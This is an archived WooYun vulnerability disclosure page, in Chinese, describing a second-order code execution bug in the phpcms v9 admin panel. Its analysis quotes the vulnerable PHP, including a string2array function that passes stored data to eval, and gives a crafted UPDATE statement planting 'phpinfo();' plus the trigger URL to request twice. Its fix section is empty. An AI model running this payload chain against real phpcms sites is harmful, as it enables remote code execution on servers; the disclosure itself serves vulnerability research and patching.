@@ -1,0 +1,316 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpcms v9 后台远程代码执行漏洞（第三弹）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpcms v9 后台远程代码执行漏洞（第三弹）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/狗狗侠">狗狗侠</a> 
+</li><li>提交时间：		2013-12-20 17:47</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-23：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-30：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-09：	细节向普通白帽子公开<br/>
+									2014-01-29：	细节向实习白帽子公开<br/>
+									2014-03-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">null</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">phpcms 官方给分要给力啊，我才能给你爆更多0day啊 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">壮大我大乌云，乌云也要给力给力啊<br />
+<br />
+前台了来了几期，干脆来个后台代码执行。<br />
+<br />
+记住。。。这是后台2次SQL执行漏洞。。。看分析。。。<br />
+<br />
+phpcms 官方给力点，到时候俺给你还来几发....<br />
+<br />
+在phpcms\modules\dbsource\data.php中add 方法<br />
+<br />
+方法很猥琐。。。。<br />
+<br />
+</p><pre><code>public function add() {<br />
+		pc_base::load_app_func(&#039;global&#039;);<br />
+		if (isset($_POST[&#039;dosubmit&#039;])) {<br />
+			$name = isset($_POST[&#039;name&#039;]) &amp;&amp; trim($_POST[&#039;name&#039;]) ? trim($_POST[&#039;name&#039;]) : showmessage(L(&#039;name&#039;).L(&#039;empty&#039;));<br />
+			$dis_type = isset($_POST[&#039;dis_type&#039;]) &amp;&amp; intval($_POST[&#039;dis_type&#039;]) ? intval($_POST[&#039;dis_type&#039;]) : 1;<br />
+			$cache = isset($_POST[&#039;cache&#039;]) &amp;&amp; intval($_POST[&#039;cache&#039;]) ? intval($_POST[&#039;cache&#039;]) : 0;<br />
+			$num = isset($_POST[&#039;num&#039;]) &amp;&amp; intval($_POST[&#039;num&#039;]) ? intval($_POST[&#039;num&#039;]) : 0;<br />
+			$type = isset($_POST[&#039;type&#039;]) &amp;&amp; intval($_POST[&#039;type&#039;]) ? intval($_POST[&#039;type&#039;]) : 0;<br />
+			//检查名称是否已经存在<br />
+			if ($this-&gt;db-&gt;get_one(array(&#039;name&#039;=&gt;$name)))  {<br />
+				showmessage(L(&#039;name&#039;).L(&#039;exists&#039;));<br />
+			}<br />
+			$sql = array();<br />
+			if ($type == &#039;1&#039;) { //自定义SQL<br />
+				$data = isset($_POST[&#039;data&#039;]) &amp;&amp; trim($_POST[&#039;data&#039;]) ? trim($_POST[&#039;data&#039;]) : showmessage(L(&#039;custom_sql&#039;).L(&#039;empty&#039;));// 这里漏洞点，这里通过获取form表单中的data数据，这里为我们构造好的sql语句<br />
+				$sql = array(&#039;data&#039;=&gt;$data);<br />
+			} else { //模型配置方式<br />
+				$module = isset($_POST[&#039;module&#039;]) &amp;&amp; trim($_POST[&#039;module&#039;]) ? trim($_POST[&#039;module&#039;]) : showmessage(L(&#039;please_select_model&#039;));<br />
+				$action = isset($_POST[&#039;action&#039;]) &amp;&amp; trim($_POST[&#039;action&#039;]) ? trim($_POST[&#039;action&#039;]) : showmessage(L(&#039;please_select_action&#039;));<br />
+				$html = pc_tag_class($module);<br />
+				$data = array();<br />
+				if (isset($html[$action]) &amp;&amp; is_array($html[$action])) {<br />
+					foreach ($html[$action] as $key=&gt;$val) {<br />
+						$val[&#039;validator&#039;][&#039;reg_msg&#039;] = $val[&#039;validator&#039;][&#039;reg_msg&#039;] ? $val[&#039;validator&#039;][&#039;reg_msg&#039;] : $val[&#039;name&#039;].L(&#039;inputerror&#039;);<br />
+						$$key = isset($_POST[$key]) &amp;&amp; trim($_POST[$key]) ? trim($_POST[$key]) : &#039;&#039;;<br />
+						if (!empty($val[&#039;validator&#039;])) {<br />
+							if (isset($val[&#039;validator&#039;][&#039;min&#039;]) &amp;&amp; strlen($$key) &lt; $val[&#039;validator&#039;][&#039;min&#039;]) {<br />
+								showmessage($val[&#039;name&#039;].L(&#039;should&#039;).L(&#039;is_greater_than&#039;).$val[&#039;validator&#039;][&#039;min&#039;].L(&#039;lambda&#039;));<br />
+							} <br />
+							if (isset($val[&#039;validator&#039;][&#039;max&#039;]) &amp;&amp; strlen($$key) &gt; $val[&#039;validator&#039;][&#039;max&#039;]) {<br />
+								showmessage($val[&#039;name&#039;].L(&#039;should&#039;).L(&#039;less_than&#039;).$val[&#039;validator&#039;][&#039;max&#039;].L(&#039;lambda&#039;));<br />
+							} <br />
+							if (!preg_match(&#039;/&#039;.$val[&#039;validator&#039;][&#039;reg&#039;].&#039;/&#039;.$val[&#039;validator&#039;][&#039;reg_param&#039;], $$key)) {<br />
+								showmessage($val[&#039;name&#039;].$val[&#039;validator&#039;][&#039;reg_msg&#039;]);<br />
+							}<br />
+						}<br />
+						$data[$key] = $$key;<br />
+					}<br />
+				}<br />
+				$sql = array(&#039;data&#039;=&gt;array2string($data), &#039;module&#039;=&gt;$module, &#039;action&#039;=&gt;$action);<br />
+			}<br />
+			<br />
+			if ($dis_type == 3) {<br />
+				$sql[&#039;template&#039;] = isset($_POST[&#039;template&#039;]) &amp;&amp; trim($_POST[&#039;template&#039;]) ? trim($_POST[&#039;template&#039;]) : &#039;&#039;;<br />
+			}<br />
+			//初始化数据<br />
+			$sql[&#039;name&#039;] = $name;<br />
+			$sql[&#039;type&#039;] = $type;<br />
+			$sql[&#039;dis_type&#039;] = $dis_type;<br />
+			$sql[&#039;cache&#039;] = $cache;<br />
+			$sql[&#039;num&#039;] = $num;<br />
+			if ($id = $this-&gt;db-&gt;insert($sql,true)) { //关键地方，这里写入我们的SQL语句，这里的SQL语句可以由我们上面的$data获得</code></pre><p class='detail'><br />
+<br />
+这里成功写入我们的sql语句如下<br />
+<br />
+我们构造好如下data 为<br />
+<br />
+update v9_datacall set module=&#039;announce&#039;,action=&#039;pc_tag&#039;,data=&#039;phpinfo();&#039;,type=&#039;2&#039; where name=123;<br />
+<br />
+<br />
+<br />
+我们再次看看phpcms\modules\dbsource\call.php<br />
+<br />
+</p><pre><code>public function get() {<br />
+		$id = isset($_GET[&#039;id&#039;]) &amp;&amp; intval($_GET[&#039;id&#039;]) ? intval($_GET[&#039;id&#039;]) : exit();<br />
+		if ($data = $this-&gt;db-&gt;get_one(array(&#039;id&#039;=&gt;$id))) {<br />
+			if (!$str = tpl_cache(&#039;dbsource_&#039;.$id,$data[&#039;cache&#039;])) {<br />
+				if ($data[&#039;type&#039;] == 1) { //自定义SQL调用<br />
+					$get_db = pc_base::load_model(&quot;get_model&quot;);<br />
+					$sql = $data[&#039;data&#039;].(!empty($data[&#039;num&#039;]) ? &quot; LIMIT $data[num]&quot; : &#039;&#039;);<br />
+					//echo $sql;<br />
+					$r= $get_db-&gt;query($sql);<br />
+					while(($s = $get_db-&gt;fetch_next()) != false) {<br />
+						$str[] = $s;<br />
+					}<br />
+				} else {<br />
+					$filepath = PC_PATH.&#039;modules&#039;.DIRECTORY_SEPARATOR.$data[&#039;module&#039;].DIRECTORY_SEPARATOR.&#039;classes&#039;.DIRECTORY_SEPARATOR.$data[&#039;module&#039;].&#039;_tag.class.php&#039;;<br />
+					//echo $filepath;<br />
+					if (file_exists($filepath)) {<br />
+					<br />
+						$pc_tag = pc_base::load_app_class($data[&#039;module&#039;].&#039;_tag&#039;, $data[&#039;module&#039;]); <br />
+						//var_dump($pc_tag);<br />
+						if (!method_exists($pc_tag, $data[&#039;action&#039;])) {<br />
+							exit();<br />
+						}<br />
+						<br />
+						$sql = string2array($data[&#039;data&#039;]);//这里真正触发漏洞，产生远程代码执行，这里必须通过2次访问链接，导致远程代码执行<br />
+						$sql[&#039;action&#039;] = $data[&#039;action&#039;];<br />
+						$sql[&#039;limit&#039;] = $data[&#039;num&#039;];</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们贴出该函数<br />
+<br />
+</p><pre><code>function string2array($data) {<br />
+	if($data == &#039;&#039;) return array();<br />
+	@eval(&quot;\$array = $data;&quot;);//代码执行鸟了。。。。<br />
+	return $array;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+说下具体过程<br />
+<br />
+当我们在数据源那里添加数据源调用<br />
+<br />
+其中名称为123  </p><p class="detail"><a href="../images/20173943d9ed4058304e1289aa07c448700168e3.jpg" target="_blank"><img src="../images/20173943d9ed4058304e1289aa07c448700168e3.jpg" alt="54O0L}8H[9P4]}Y]05Z]OFH.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+然后我们访问调用链接如下<br />
+<br />
+http://127.0.0.1/v9/index.php?m=dbsource&amp;c=call&amp;a=get&amp;id=19<br />
+<br />
+我们必须访问2次，因为第一次执行的时候，执行的是更改type为2 ，<br />
+<br />
+update v9_datacall set module=&#039;announce&#039;,action=&#039;pc_tag&#039;,data=&#039;phpinfo();&#039;,type=&#039;2&#039; where name=123;<br />
+<br />
+详情就看看上面的call.php中的分析了<br />
+<br />
+当我们访问2次的时候，我们的代码就到<br />
+<br />
+</p><pre><code>} else {<br />
+					$filepath = PC_PATH.&#039;modules&#039;.DIRECTORY_SEPARATOR.$data[&#039;module&#039;].DIRECTORY_SEPARATOR.&#039;classes&#039;.DIRECTORY_SEPARATOR.$data[&#039;module&#039;].&#039;_tag.class.php&#039;;<br />
+					//echo $filepath;<br />
+					if (file_exists($filepath)) {<br />
+					<br />
+						$pc_tag = pc_base::load_app_class($data[&#039;module&#039;].&#039;_tag&#039;, $data[&#039;module&#039;]); <br />
+						//var_dump($pc_tag);<br />
+						if (!method_exists($pc_tag, $data[&#039;action&#039;])) {<br />
+							exit();<br />
+						}<br />
+						<br />
+						$sql = string2array($data[&#039;data&#039;]);</code></pre><p class='detail'><br />
+<br />
+到这里执行了<br />
+<br />
+</p><p class="detail"><a href="../images/20174309948e997855ae1b77a4a15d937ee2ef3b.jpg" target="_blank"><img src="../images/20174309948e997855ae1b77a4a15d937ee2ef3b.jpg" alt="YFA}C]BYW_)C}H4U}~{CDFE.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"></p><p class="detail"><a href="../images/20174309948e997855ae1b77a4a15d937ee2ef3b.jpg" target="_blank"><img src="../images/20174309948e997855ae1b77a4a15d937ee2ef3b.jpg" alt="YFA}C]BYW_)C}H4U}~{CDFE.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/狗狗侠" title="狗狗侠">狗狗侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046565" title="phpcms v9 后台远程代码执行漏洞（第三弹）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-12-20 18:47</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">收到！！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46565";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
